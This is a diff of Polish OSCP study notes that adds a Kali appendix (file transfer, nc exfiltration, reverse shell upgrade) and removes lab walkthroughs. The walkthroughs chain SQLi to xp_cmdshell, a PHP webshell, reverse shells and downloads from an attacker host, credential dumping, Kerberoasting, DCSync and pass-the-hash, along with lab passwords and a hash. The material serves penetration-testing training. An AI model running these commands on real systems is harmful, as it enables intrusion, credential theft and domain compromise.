@@ -551,7 +551,7 @@ EXECUTE xp_cmdshell 'whoami';
 
 ### ASP.NET WebForms (`.aspx` login) SQLi → RCE — manualnie przez curl
 
-> Klasyk OSCP (np. challenge „Medtech"): formularz `login.aspx` z polami `...$UsernameTextBox`/`...$PasswordTextBox`. Dwie pułapki, przez które łatwo uznać, że „nie ma injekcji":
+> Klasyk OSCP: formularz ASP.NET `login.aspx` z polami `...$UsernameTextBox`/`...$PasswordTextBox`. Dwie pułapki, przez które łatwo uznać, że „nie ma injekcji":
 > 1. **VIEWSTATE:** KAŻDY POST musi nieść świeże `__VIEWSTATE`, `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION` pobrane GET-em tuż przed. Bez tego serwer zwraca **HTTP 500 (viewstate MAC)** — a wysłanie poprawnych tokenów i dostanie 200 to zarazem **dowód, że POST jest przetwarzany**.
 > 2. **Pusta tabela userów:** `OR 1=1` nie zaloguje i error-based przez `WHERE` milczy (brak wierszy do ewaluacji predykatu). Nie odpuszczaj — testuj **stacked queries** i **time-based**.
 
@@ -3682,7 +3682,9 @@ cat /root/proof.txt 2>/dev/null; cat /home/*/local.txt 2>/dev/null
 
 ---
 
-# Appendix A — Skróty klawiszowe shell (readline)
+# Appendix A — Kali Linux praktyka
+
+## Skróty klawiszowe shella (readline)
 
 | Akcja | Skrót | Mnemonik |
 |-------|-------|----------|
@@ -3698,7 +3700,88 @@ cat /root/proof.txt 2>/dev/null; cat /home/*/local.txt 2>/dev/null
 | Szukaj w historii | `Ctrl + R` | **R**everse search |
 | Przerwij / wklej ostatni kill | `Ctrl + C` / `Ctrl + Y` | Yank |
 
----
+## zsh — naprawa i prewencja „corrupt history file"
+
+Objaw: przy otwarciu terminala `zsh: corrupt history file /home/kali/.zsh_history`. Przyczyna: `SHARE_HISTORY` (domyślne w oh-my-zsh) + **wiele równoległych terminali** zapisuje `~/.zsh_history` **bez blokady** → plik się rozjeżdża. Kasowanie historii „pomaga", ale traci historię i wraca.
+
+**Prewencja (raz — dopisz na KOŃCU `~/.zshrc`, po `source $ZSH/oh-my-zsh.sh`):**
+```bash
+setopt HIST_FCNTL_LOCK        # ← właściwy fix: blokada fcntl na pliku przy każdym zapisie
+setopt EXTENDED_HISTORY HIST_IGNORE_ALL_DUPS HIST_REDUCE_BLANKS SHARE_HISTORY
+HISTFILE=~/.zsh_history; HISTSIZE=100000; SAVEHIST=100000
+```
+```bash
+source ~/.zshrc               # przeładuj (albo po prostu otwórz nowy terminal)
+```
+
+**Naprawa, gdy JUŻ się uszkodzi (bez utraty historii):**
+```bash
+cd ~
+cp .zsh_history .zsh_history.bak                             # backup
+iconv -f UTF-8 -t UTF-8 -c .zsh_history.bak -o .zsh_history  # usuń tylko uszkodzone bajty, zachowaj wpisy
+fc -R                                                        # przeładuj historię w bieżącej powłoce
+rm .zsh_history.bak
+```
+> Prostsza (ale gubi timestampy): `strings ~/.zsh_history > /tmp/h && mv /tmp/h ~/.zsh_history`. Po włączeniu `HIST_FCNTL_LOCK` problem przestaje wracać.
+
+## Terminal — szybkie triki
+```bash
+!!               # ostatnia komenda        |  sudo !!  → powtórz ją z sudo
+!$               # ostatni argument poprzedniej komendy
+cd -             # skok do poprzedniego katalogu
+Ctrl+R           # reverse-search w historii (masz fzf-tab → ładniejszy wybór)
+Ctrl+X Ctrl+E    # otwórz bieżącą (długą) komendę w $EDITOR
+python3 -m http.server 80    # szybki serwer HTTP do transferu plików na cele
+```
+
+## tmux — podstawy (sesje przeżywają zerwanie VPN/SSH)
+```bash
+tmux new -s pentest      # nowa nazwana sesja
+tmux ls                  # lista sesji
+tmux a -t pentest        # attach (dołącz z powrotem)
+# prefix = Ctrl+B, potem:
+#   d           odłącz (sesja żyje dalej w tle)
+#   c           nowe okno    |  n / p  następne/poprzednie  |  0-9  skok do okna
+#   %           podziel pionowo   |  "   podziel poziomo
+#   strzałki    ruch między panelami  |  z  zoom panelu  |  x  zamknij panel
+#   [           tryb scroll/copy (PgUp/PgDn; q wychodzi)
+```
+> Odpalaj długie skany/`nc` w tmux — przetrwają zerwanie VPN albo reset terminala.
+
+## Transfer plików (Kali ↔ cel)
+```bash
+# Serwuj z Kali:
+python3 -m http.server 80                       # HTTP
+impacket-smbserver share . -smb2support         # SMB (Win: copy \\KALI\share\plik .)
+
+# Pobranie NA cel:
+#   Linux:    wget http://KALI/plik      |  curl -O http://KALI/plik
+#   Windows:  iwr -uri http://KALI/plik -Outfile plik
+#             certutil -urlcache -split -f http://KALI/plik plik
+
+# Wyciągnięcie Z celu na Kali:
+nc -lvnp 4444 > plik            # Kali (odbiór)      |  cel:  nc KALI 4444 < plik
+scp user@cel:/sciezka/plik .    # gdy jest SSH
+# evil-winrm ma wbudowane:  download <zdalny> <lokalny>   /   upload <lokalny> <zdalny>
+```
+
+## Kodowanie / dekodowanie (one-linery)
+```bash
+echo -n 'tekst' | base64                        # base64 encode   |  base64 -d  = decode
+echo -n 'a b&c' | jq -sRr @uri                  # URL-encode
+python3 -c 'import urllib.parse,sys;print(urllib.parse.unquote(sys.argv[1]))' 'a%20b'   # URL-decode
+echo -n 'tekst' | xxd -p                        # → hex           |  xxd -r -p  = z hex
+echo -n 'tekst' | md5sum                        # md5 (sha1sum / sha256sum analogicznie)
+```
+
+## Reverse shell — złap i podnieś do pełnego TTY
+```bash
+nc -lvnp 443                                     # listener na Kali; po złapaniu shella (Linux):
+python3 -c 'import pty;pty.spawn("/bin/bash")'   # 1) PTY
+# Ctrl+Z                                         # 2) uśpij shell
+stty raw -echo; fg                               # 3) na Kali (jednym ciągiem)
+export TERM=xterm; stty rows 50 cols 200         # 4) w shellu ofiary (Ctrl+C/strzałki/tab działają)
+```
 
 ---
 
@@ -3817,358 +3900,3 @@ cat proof.txt                       # / type proof.txt
 
 ---
 
-# Appendix C — Medtech Challenge Lab (walkthrough, styl kursowy)
-
-> Duży łańcuch: brzegowy web (SQLi) → pivot → cała domena `medtech.com`. Pisane prosto — jedna komenda = jeden krok, z wyjaśnieniem. Wartości flag zredagowane (`<proof>`) — to publiczna strona. `<KALI>` = Twój tun0.
-> Hosty: WEB02 `192.168.224.121` (wejście, dual-homed do `172.16.224.254`), FILES02 `172.16.224.11`, DC01 `172.16.224.10`.
->
-> 🚩 **REGUŁA OSCP — CZYTANIE FLAG:** flagę pokaż w **interaktywnym shellu** (`type`/`cat`) + screenshot z IP. **Zero punktów** za flagę z webshella lub jednorazowego `-cmd`. Tu WEB02 czytasz z reverse shella (nc), FILES02 z `evil-winrm`, DC01 z `wmiexec` — wszystko interaktywne = OK.
-
-## C.1 Rozpoznanie
-```bash
-nmap -sV -p- --min-rate 2000 192.168.224.121
-```
-WEB02 = IIS/ASP.NET (strona „MedTech") + SMB + WinRM. Sieć wewnętrzna `172.16.224.0/24` — dojdziemy przez pivot.
-
-## C.2 WEB02 — SQL Injection na login.aspx
-Strona logowania to ASP.NET WebForms. Ważne: przy każdym POST musisz wysłać świeże pola `__VIEWSTATE`, `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION` (pobierz je GET-em tuż przed). Najprościej użyć **Burp Repeater** (albo sqlmap z zapisanego requestu).
-```bash
-# potwierdzenie iniekcji - w polu username wpisz payload psujący składnię (błąd MSSQL wyjdzie na stronie):
-#   ' OR 1=1#          -> "Incorrect syntax near '#'" = Microsoft SQL Server
-# potwierdź, że iniekcja wykonuje osobne polecenia (stacked) opóźnieniem czasowym:
-#   ';WAITFOR DELAY '0:0:5'-- -                                  (odpowiedź po ~5s)
-#   ';IF IS_SRVROLEMEMBER('sysadmin')=1 WAITFOR DELAY '0:0:5'-- - (5s = jesteśmy sysadmin)
-```
-Alternatywnie automatem (zapisz request z Burpa do pliku `login.req`):
-```bash
-sqlmap -r login.req --batch --dbms=mssql --technique=T          # potwierdź; potem --os-shell dla RCE
-```
-
-## C.3 WEB02 — z SQLi do RCE (xp_cmdshell) i shell
-```bash
-# w polu username, jako sysadmin, włącz xp_cmdshell (każdy payload to osobny POST ze świeżym viewstate):
-#   ';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -
-# test wykonania - ping do siebie i podsłuch:
-sudo tcpdump -i tun0 icmp
-#   ';EXEC master..xp_cmdshell 'ping <KALI>'-- -
-```
-Reverse shell (PowerShell, metoda z kursu):
-```bash
-nc -lvnp 443                                                     # listener na Kali
-# wygeneruj payload base64 (przykład z modułu; podmień IP/port), potem:
-#   ';EXEC master..xp_cmdshell 'powershell -e <BASE64>'-- -
-```
-Shell wraca jako konto usługi MSSQL. `type C:\inetpub\wwwroot\web.config` → connection string `sa`. `ipconfig` → WEB02 ma też `172.16.224.254` (most do domeny).
-
-## C.4 WEB02 — PrivEsc do SYSTEM (SeImpersonate)
-```bash
-# w shellu: whoami /priv  -> SeImpersonatePrivilege = Enabled
-# hostuj narzędzia na Kali:
-python3 -m http.server 8000        # w katalogu z PrintSpoofer64.exe i nc.exe
-# na WEB02 pobierz i uruchom:
-#   certutil -urlcache -split -f http://<KALI>:8000/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
-#   certutil -urlcache -split -f http://<KALI>:8000/nc.exe C:\Windows\Temp\nc.exe
-# nowy listener: nc -lvnp 4445 na Kali, potem na WEB02:
-#   C:\Windows\Temp\ps.exe -c "C:\Windows\Temp\nc.exe <KALI> 4445 -e cmd.exe"     -> nt authority\system
-# flaga: type C:\Users\Administrator\Desktop\proof.txt   (= <proof>)
-```
-
-## C.5 WEB02 — zbierz creds (jako SYSTEM)
-```bash
-# na WEB02 zrzuć hive'y rejestru:
-#   reg save HKLM\SAM C:\Windows\Temp\sam /y
-#   reg save HKLM\SYSTEM C:\Windows\Temp\system /y
-#   reg save HKLM\SECURITY C:\Windows\Temp\security /y
-# przenieś pliki na Kali (np. przez SMB) i wyciągnij:
-impacket-secretsdump -sam sam -system system -security security LOCAL
-#   -> plaintext DefaultPassword: Flowers1  + cached DCC2 dla joe
-```
-
-## C.6 Pivot do sieci wewnętrznej (chisel)
-```bash
-chisel server -p 8080 --reverse            # na Kali
-# na WEB02: pobierz chisel.exe (certutil, jak wyżej) i odpal klienta:
-#   C:\Windows\Temp\chisel.exe client <KALI>:8080 R:socks
-# -> SOCKS 127.0.0.1:1080. Do wewnątrz: proxychains -q <narzędzie>
-```
-
-## C.7 FILES02 — spray creds → shell + creds
-```bash
-# spray hasła po sieci wewnętrznej (nxc pokaże (Pwn3d!) gdzie konto jest adminem):
-proxychains -q nxc smb 172.16.224.0/24 -u joe -p 'Flowers1' -d medtech.com
-#   -> joe jest lokalnym adminem na FILES02
-proxychains -q evil-winrm -i 172.16.224.11 -u joe -p 'Flowers1'     # shell + flagi
-# zrzut creds zdalnie (joe = admin):
-proxychains -q impacket-secretsdump 'medtech.com/joe:Flowers1@172.16.224.11'
-#   -> cached DCC2 dla yoshi, wario
-```
-
-## C.8 Łamanie DCC2
-```bash
-# skopiuj hashe DCC2 do pliku dcc2.txt (format $DCC2$...), potem:
-hashcat -m 2100 dcc2.txt /usr/share/wordlists/rockyou.txt
-#   -> yoshi : Mushroom!   (i wario : Mushroom!)
-```
-
-## C.9 Droga do DC — konto w Backup Operators
-```bash
-# enumeracja: kto jest uprzywilejowany (adminCount=1) i w jakich grupach:
-proxychains -q nxc ldap 172.16.224.10 -u yoshi -p 'Mushroom!' -d medtech.com --admin-count
-proxychains -q nxc ldap 172.16.224.10 -u yoshi -p 'Mushroom!' -d medtech.com --query "(sAMAccountName=joe)" "memberOf"
-#   -> joe (którego mamy) jest w grupie "Backup Operators"
-```
-`Backup Operators` = prawo czytania dowolnego pliku/rejestru (SeBackupPrivilege). Zrzuć rejestr DC:
-```bash
-# zapisz hive'y DC do NETLOGON (czytelne dla każdego usera, bo joe nie jest adminem i nie wejdzie na C$):
-proxychains -q impacket-reg medtech.com/joe:'Flowers1'@172.16.224.10 backup -o 'C:\Windows\SYSVOL\domain\scripts'
-# pobierz je jako joe przez share NETLOGON:
-proxychains -q impacket-smbclient medtech.com/joe:'Flowers1'@172.16.224.10
-#   use NETLOGON ; get SAM.save ; get SYSTEM.save ; get SECURITY.save ; exit
-# wyciągnij hash konta maszyny DC:
-impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
-#   -> $MACHINE.ACC : <hash DC01$>
-```
-
-## C.10 DCSync → cała domena → flaga na DC
-```bash
-# konto maszyny DC ma prawa replikacji -> DCSync:
-proxychains -q impacket-secretsdump -just-dc -hashes :<hash_DC01$> 'medtech.com/DC01$@172.16.224.10'
-#   -> Administrator NTLM, krbtgt, leon (Domain Admin)...
-# wejdź na DC domenowym Administratorem (Pass-the-Hash) i weź flagę:
-proxychains -q impacket-wmiexec -hashes :<hash_Administrator> medtech.com/Administrator@172.16.224.10
-#   type C:\Users\Administrator\Desktop\proof.txt   (= <proof>)
-# domenowy Administrator = admin wszędzie -> zbierz flagi z pozostałych hostów tym samym hashem.
-```
-
-## C.11 Sprzątanie (oceniane wg reguł)
-```bash
-# usuń narzędzia i zrzuty które zostawiłeś, szczególnie z NETLOGON (widoczne dla całej domeny!):
-#   del C:\Windows\SYSVOL\domain\scripts\SAM.save ...\SYSTEM.save ...\SECURITY.save
-#   del C:\Windows\Temp\ps.exe C:\Windows\Temp\nc.exe C:\Windows\Temp\chisel.exe
-#   przywróć xp_cmdshell do stanu wyłączonego: ';EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE;-- -
-# zamknij tunele/listenery na Kali.
-```
-# Appendix D — OSCP Challenge Lab A (walkthrough, styl kursowy)
-
-> 6 maszyn: 3 standalone (`.143`,`.144`,`.145`) + 3 w AD `oscp.exam` (MS01 `.141`, DC01 `10.10.224.140`, MS02 `10.10.224.142`). Assumed-breach do AD: `Eric.Wallows : EricLikesRunning800`. `<KALI>` = Twój tun0.
-> Pisane prosto, jedna komenda = jeden krok, z wyjaśnieniem. Zrobione: **.143 (root)**, **MS01 (SYSTEM)**. Reszta — patrz D.6 (uczciwy stan + jak dokończyć).
->
-> 🚩 **REGUŁA OSCP — CZYTANIE FLAG:** `local.txt`/`proof.txt` MUSISZ pokazać w **interaktywnym shellu** komendą `type`/`cat` z oryginalnej lokalizacji + screenshot z IP celu. **Zero punktów** za flagę z webshella, przez `exploit.py --cmd`, lub `-cmd '...type...'` jednorazówką. Windows: SYSTEM/Administrator/admin shell. Linux: root shell. `evil-winrm`/`psexec`/`wmiexec`/`ssh`/reverse shell = **OK**; webshell = **NIE**.
-
-## D.1 Rozpoznanie sieci
-```bash
-# osiągalne wprost są .141/.143/.144/.145 (192.168.224.x); 10.10.224.x tylko przez pivot
-nmap -sV -p- --min-rate 2000 192.168.224.141
-nmap -sV -p- --min-rate 2000 192.168.224.143
-nmap -sV -p- --min-rate 2000 192.168.224.144
-nmap -sV -p- --min-rate 2000 192.168.224.145
-```
-Kluczowe: `.141` = IIS/Apache + **Attendance and Payroll System** (port 81) → wejście do AD. `.143` = porty 3000-3003 nietypowe. `.145` = port 1978 (RemoteMouse).
-
-## D.2 Standalone .143 — Aerospike → root
-```bash
-# porty 3000-3003 nie mówią HTTP -> sprawdź protokół tekstowy:
-printf 'version\r\n' | nc 192.168.224.143 3003        # -> Aerospike Community Edition build 5.1.0.1
-# 5.1.0.1 jest podatne (CVE-2020-13151). Publiczny exploit:
-searchsploit Aerospike
-searchsploit -m multiple/remote/49067.py
-python3 -m venv venv && ./venv/bin/pip install aerospike     # exploit potrzebuje klienta python
-# exploit ma błędny check wersji + krótki timeout -> popraw w 49067.py:
-#   w funkcji _is_vuln() dodaj na początku:  return True
-#   w client.apply(...) dodaj policy: {'total_timeout':60000,'socket_timeout':60000}
-# RCE jako aero (blind, io.popen zwraca output — to NIE interaktywny shell):
-./venv/bin/python 49067.py --ahost 192.168.224.143 --aport 3000 --namespace test --cmd 'id'
-```
-> ⚠️ **REGUŁA OSCP: flaga TYLKO z interaktywnego shella (`cat`), nie przez exploit `--cmd` = 0 pkt.** Egress bywa filtrowany (brak reverse shella), ale **SSH (22) jest inbound** — wgraj swój klucz przez RCE i zaloguj się interaktywnie.
-```bash
-ssh-keygen -f aero_key -N ''
-KEY=$(cat aero_key.pub)
-./venv/bin/python 49067.py --ahost 192.168.224.143 --aport 3000 --namespace test --cmd "mkdir -p /home/aero/.ssh; echo $KEY > /home/aero/.ssh/authorized_keys; chmod 600 /home/aero/.ssh/authorized_keys"
-ssh -i aero_key aero@192.168.224.143            # INTERAKTYWNY shell jako aero
-#   w tym shellu:  cat /home/aero/local.txt       <-- LOCAL.TXT (interaktywny shell, cat)
-# PrivEsc — SUID screen 4.05.00 (CVE-2017-5618):
-find / -perm -4000 -type f 2>/dev/null           # -> /usr/bin/screen-4.5.0
-searchsploit screen 4.5.0                         # 41154 (libhax.so kompiluj na Kali, wgraj base64)
-# lancuch EDB 41154 tworzy SUID /tmp/rootbash:
-/tmp/rootbash -p                                  # INTERAKTYWNY root shell
-#   w root shellu:  cat /root/proof.txt           <-- PROOF.TXT (interaktywny root shell, cat)
-```
-
-## D.3 MS01 (.141) — Attendance and Payroll System → SYSTEM
-> ⚠️ **REGUŁA OSCP: webshell służy TYLKO do zdobycia dostępu — flag NIGDY nie czyta się z webshella (`shell.php?cmd=type` = 0 pkt).** Użyj webshella do privesc, a flagę czytaj z **interaktywnego shella** (reverse shell / evil-winrm) jako SYSTEM/admin. (MS01 to host AD — proof jest tylko na DC01, patrz D.6.)
-```bash
-# publiczny unauth RCE (upload webshella):
-searchsploit Attendance Payroll        # 50801 (RCE) / 50802 (SQLi)
-# webshell (jak w materiałach - prosty cmd shell):
-echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
-# upload przez podatny endpoint (aplikacja jest w web-root, więc bez /apsystem):
-curl -F "id=1" -F "upload=" -F "photo=@shell.php;filename=shell.php" http://192.168.224.141:81/admin/employee_edit_photo.php
-# webshell ląduje w /images/ :
-curl "http://192.168.224.141:81/images/shell.php?cmd=whoami"     # -> ms01\mary.williams
-```
-PrivEsc — SeImpersonate → SYSTEM (metoda z kursu):
-```bash
-# whoami /priv przez webshell -> SeImpersonatePrivilege -> potato
-# hostuj narzędzia na Kali:
-python3 -m http.server 8000       # w katalogu z GodPotato-NET4.exe, nc.exe
-# na MS01 (przez webshell, cmd=...):
-#   certutil -urlcache -split -f http://<KALI>:8000/GodPotato-NET4.exe C:\Windows\Temp\gp.exe
-#   C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"     -> nt authority\system
-# jako SYSTEM: reg save HKLM\SAM/SYSTEM/SECURITY -> impacket-secretsdump ... LOCAL (lokalne hashe)
-# łup: admin/includes/conn.php -> MySQL root : TreeFlaskDomestic505
-```
-
-## D.4 Pivot do sieci AD (chisel)
-```bash
-# MS01 jest dual-homed (ma też 10.10.224.141). Tunel:
-chisel server -p 8080 --reverse                       # na Kali
-# na MS01 (przez webshell): pobierz chisel.exe i odpal klienta:
-#   certutil -urlcache -split -f http://<KALI>:8000/chisel.exe C:\Windows\Temp\ch.exe
-#   C:\Windows\Temp\ch.exe client <KALI>:8080 R:socks
-# -> SOCKS na 127.0.0.1:1080. Wszystko do AD: proxychains -q <narzędzie>
-# w /etc/proxychains4.conf ma być: socks5 127.0.0.1 1080
-```
-
-## D.5 Enumeracja AD (assumed breach: Eric.Wallows)
-```bash
-# identyfikacja hostów wewnętrznych:
-proxychains -q nxc smb 10.10.224.140 10.10.224.142 -u Eric.Wallows -p 'EricLikesRunning800' -d oscp.exam
-#   .140 = DC01, .142 = MS02
-
-# Kerberoasting. UWAGA: jeśli dostaniesz KRB_AP_ERR_SKEW (clock skew), zsynchronizuj zegar.
-#   Na egzaminie: sudo ntpdate <DC>  (albo sudo rdate -n <DC>)
-#   Jeśli sudo bez hasła niedostępne: użyj faketime z offsetem godzinowym:
-faketime -f '+7h' proxychains -q impacket-GetUserSPNs -dc-ip 10.10.224.140 \
-  oscp.exam/Eric.Wallows:'EricLikesRunning800' -request -outputfile kerb.txt
-hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
-#   -> web_svc : Diamond1   (sql_svc = patrz D.6)
-
-# mapa domeny (BloodHound przez pivot):
-proxychains -q bloodhound-python -u web_svc -p Diamond1 -d oscp.exam -ns 10.10.224.140 --dns-tcp -c All --zip
-#   cel = tom_admin (Domain Admin)
-```
-
-## D.6 Stan i jak dokończyć (uczciwie)
-- **Zrobione czysto:** `.143` (root, obie flagi), **MS01** (SYSTEM + pivot).
-- **AD → DC (MS02→tom_admin→DC01):** brama to **MSSQL na MS02 przez konto `sql_svc`** (drugi kerberoast). Gdy złamiesz sql_svc:
-  ```bash
-  # MSSQL jako sql_svc (sysadmin) -> włącz i użyj xp_cmdshell:
-  proxychains -q impacket-mssqlclient oscp.exam/sql_svc:'<hasło>'@10.10.224.142 -windows-auth
-  #   SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;
-  #   SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
-  #   SQL> EXEC xp_cmdshell 'whoami';    -> shell na MS02 -> dump creds -> tom_admin -> DC01 proof.txt
-  ```
-  U mnie sql_svc nie złamał się (rockyou/best64/dive ani custom słownik z cewl+nazwiska). Na egzaminie to konto ZWYKLE łamie się rockyou — jeśli nie, buduj custom słownik: `cewl -d 3 -m 3 <każda strona> > words.txt`, potem `hashcat -m 13100 kerb.txt words.txt -r rules/best64.rule` oraz hybryda `-a 6 words.txt ?d?d?d`.
-- **.144:** wystawiony `.git` w web-root → `git-dumper http://192.168.224.144/.git/ out` → w historii creds do bazy „staff" (`dean:BreakingBad92`) i podatny custom-API (`export.php` = zapis pliku). Uwaga: apka nie była u mnie wdrożona pod znaną ścieżką — dokończenie wymaga znalezienia deploymentu.
-- **.145:** port 1978 = **RemoteMouse 3.008 RCE** → `msfconsole` → `use exploit/windows/misc/remote_mouse_rce` (jeden dozwolony strzał MSF na egzaminie). Wymaga aktywnej sesji pulpitu na celu.
-
----
-
-# Appendix E — OSCP Challenge Lab B (walkthrough, styl kursowy)
-
-> 6 maszyn: 3 standalone (`.149`,`.150`,`.151`) + 3 w AD `oscp.exam` (MS01 `.147`, DC01 `10.10.224.146`, MS02 `10.10.224.148`). Assumed-breach do AD: `Eric.Wallows : EricLikesRunning800`. `<KALI>`=tun0. Wynik: **.149 root, .151 SYSTEM, AD → DC01 przejęte** (5/6). `.150` — patrz E.7.
->
-> 🚩 **REGUŁA OSCP — CZYTANIE FLAG:** `local.txt`/`proof.txt` MUSISZ pokazać w **interaktywnym shellu** komendą `type`/`cat` z oryginalnej lokalizacji + screenshot z IP celu (`ip a`/`ipconfig`). **Zero punktów** za flagę pobraną: z webshella, przez `exploit.py --cmd`, przez `nxc/wmiexec/gp.exe -cmd '...type...'` jako jednorazówkę. Windows: shell jako SYSTEM/Administrator/admin. Linux: root shell. `evil-winrm`, `psexec`, `impacket-wmiexec` (prompt), `ssh`, reverse shell = **OK** (to interaktywne shelle). Webshell = **NIE**.
-
-## E.1 Rozpoznanie
-```bash
-nmap -sV -p- --min-rate 2000 192.168.224.147   # MS01: 21,445,5985(WinRM),8000/8080/8443(web) -> AD entry
-nmap -sV -p- --min-rate 2000 192.168.224.149   # 21(vsftpd),22,80 -> UWAGA sprawdz tez UDP!
-nmap -sV -p- --min-rate 2000 192.168.224.150   # 22, 8080 (Spring/Tomcat)
-nmap -sV -p- --min-rate 2000 192.168.224.151   # 80,3389,5060(FreeSWITCH),8081
-```
-
-## E.2 Standalone .149 — SNMP → SSH → SUID → root
-```bash
-# TCP nic nie dalo (web=default Apache, FTP anon off) -> skan UDP:
-nmap -sU --top-ports 100 192.168.224.149        # 161/udp open snmp
-onesixtyone 192.168.224.149 public              # community "public" dziala
-snmpwalk -v2c -c public 192.168.224.149 1.3.6.1.4.1.8072.1.3.2   # NET-SNMP extend
-#   -> skrypt "RESET_PASSWD" resetuje haslo usera kiero do domyslnego; userzy john, kiero
-# domyslne haslo:
-nxc ftp 192.168.224.149 -u kiero -p kiero       # [+] kiero:kiero
-# FTP jako kiero -> prywatne klucze SSH:
-ftp kiero:kiero -> get id_rsa (klucz usera john)
-ssh -i id_rsa john@192.168.224.149              # INTERAKTYWNY shell jako john
-#   w tym shellu:  cat /home/john/local.txt      <-- LOCAL.TXT (interaktywny shell, cat)
-# privesc: SUID binarka RESET_PASSWD wola 'chpasswd' bez sciezki -> PATH hijack:
-cd /tmp; printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > chpasswd
-chmod +x chpasswd; export PATH=/tmp:$PATH; /home/john/RESET_PASSWD
-/tmp/rootbash -p                                # INTERAKTYWNY root shell (NIE -c)
-#   w root shellu:  cat /root/proof.txt          <-- PROOF.TXT (interaktywny root shell, cat)
-```
-
-## E.3 Standalone .151 — FreeSWITCH → SYSTEM
-> ⚠️ **REGUŁA OSCP — flagi TYLKO z interaktywnego shella (`type`/`cat`), nigdy przez exploit `--cmd` ani webshell = 0 pkt.** RCE FreeSWITCH i GodPotato `-cmd` służą tylko do zdobycia dostępu; flagę czytasz dopiero z prawdziwego shella (reverse shell / evil-winrm).
-```bash
-# port 5060 = FreeSWITCH; mod_event_socket (port 8021, haslo domyslne "ClueCon") = RCE
-searchsploit FreeSWITCH                          # 47799
-# event-socket: polacz 8021, auth ClueCon, "api system <cmd>". RCE tylko do zdobycia INTERAKTYWNEGO shella:
-# 1) listener: nc -lvnp 4151    2) odpal reverse shell przez RCE (PS -e <base64 payloadu do <KALI>:4151>):
-python3 free.py 'powershell -e <BASE64_REVERSE_SHELL>'
-# --- w interaktywnym shellu (jako oscp\chris): ---
-#   whoami ; type C:\Users\chris\Desktop\local.txt        <-- LOCAL.TXT z interaktywnego shella
-# privesc: chris ma SeImpersonate -> GodPotato daje interaktywny SYSTEM shell (nowy reverse shell):
-#   certutil -urlcache -split -f http://<KALI>:8000/GodPotato-NET4.exe C:\Windows\Temp\gp.exe
-#   certutil -urlcache -split -f http://<KALI>:8000/nc.exe C:\Windows\Temp\nc.exe   (listener: nc -lvnp 4152)
-#   C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\nc.exe <KALI> 4152 -e cmd.exe"
-# --- w interaktywnym SYSTEM shellu: ---
-#   whoami   (nt authority\system) ; type C:\Users\Administrator\Desktop\proof.txt   <-- PROOF.TXT
-```
-
-## E.4 AD — foothold MS01 + local privesc (SeImpersonate)
-```bash
-# assumed breach: Eric.Wallows ma WinRM na MS01 (jest w "Remote Management Users"):
-nxc winrm 192.168.224.147 -u Eric.Wallows -p 'EricLikesRunning800'   # (Pwn3d!)
-evil-winrm -i 192.168.224.147 -u Eric.Wallows -p 'EricLikesRunning800'
-#   whoami /priv -> SeImpersonatePrivilege ; ipconfig -> dual-homed 10.10.224.147
-# local privesc: SeImpersonate -> PrintSpoofer, dodaj Eric do lokalnych adminow:
-iwr http://<KALI>:8000/PrintSpoofer64.exe -OutFile ps.exe
-.\ps.exe -c "cmd /c net localgroup Administrators oscp\Eric.Wallows /add"
-# teraz Eric = lokalny admin -> secretsdump (LSA autologon):
-impacket-secretsdump 'oscp.exam/Eric.Wallows:EricLikesRunning800@192.168.224.147'
-#   -> DefaultPassword (autologon): celia.almeda : 7k8XHk3dMtmpnC7
-```
-
-## E.5 AD — pivot + Kerberoasting
-```bash
-# postaw pivot chisel przez MS01 (Eric admin -> scheduled task jako SYSTEM zeby persystentnie):
-#   Kali: chisel server -p 8080 --reverse
-#   MS01: schtasks /create /tn p /tr "C:\...\ch.exe client <KALI>:8080 R:socks" /sc onstart /ru SYSTEM /f; schtasks /run /tn p
-# internal: DC01=10.10.224.146, MS02=10.10.224.148
-proxychains -q nxc smb 10.10.224.146 10.10.224.148 -u Eric.Wallows -p 'EricLikesRunning800' -d oscp.exam
-# Kerberoast (uwaga clock skew -> faketime):
-faketime -f '+7h' proxychains -q impacket-GetUserSPNs -dc-ip 10.10.224.146 \
-  oscp.exam/Eric.Wallows:'EricLikesRunning800' -request -outputfile kerb.txt
-hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
-#   -> web_svc:Diamond1 ; sql_svc:Dolphin1
-```
-
-## E.6 AD — SQL Server (MS02) → SYSTEM → Domain Admin → DC01
-```bash
-# sql_svc jest sysadmin na MSSQL (MS02). Wlacz xp_cmdshell:
-faketime -f '+7h' proxychains -q impacket-mssqlclient oscp.exam/sql_svc:'Dolphin1'@10.10.224.148 -windows-auth
-#   SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;
-#   SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
-#   SQL> EXEC xp_cmdshell 'whoami';   -> nt service\mssql$sqlexpress (ma SeImpersonate)
-# MS02 nie siega Kali -> hostuj GodPotato na MS01 (Everyone-READ share) i pobierz z niego:
-#   MS01(Eric admin): mkdir C:\tools; copy gp.exe C:\tools; net share tools=C:\tools /grant:Everyone,READ
-#   MSSQL> EXEC xp_cmdshell 'copy \\10.10.224.147\tools\gp.exe C:\Windows\Temp\gp.exe'
-#   MSSQL> EXEC xp_cmdshell 'C:\Windows\Temp\gp.exe -cmd "cmd /c net localgroup Administrators oscp\Eric.Wallows /add"'
-# Eric admin na MS02 -> wyciagnij DA z pamieci (LSASS/Mimikatz):
-proxychains -q nxc smb 10.10.224.148 -u Eric.Wallows -p 'EricLikesRunning800' -d oscp.exam -M lsassy
-#   -> OSCP\Administrator NTLM 59b280ba707d22e3ef0aa587fc29ffe5 (DA w pamieci!)
-# Pass-the-Hash na DC01 -> INTERAKTYWNY shell (wmiexec/psexec/evil-winrm = OK wg reguł, to NIE webshell):
